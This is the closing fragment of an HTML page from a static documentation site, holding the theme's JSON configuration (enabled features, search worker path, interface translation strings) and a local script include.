    <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.annotate", "content.code.copy", "navigation.footer", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.suggest", "toc.follow"], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../../assets/javascripts/bundle.83f73b43.min.js"></script>
      
    
  </body>
</html>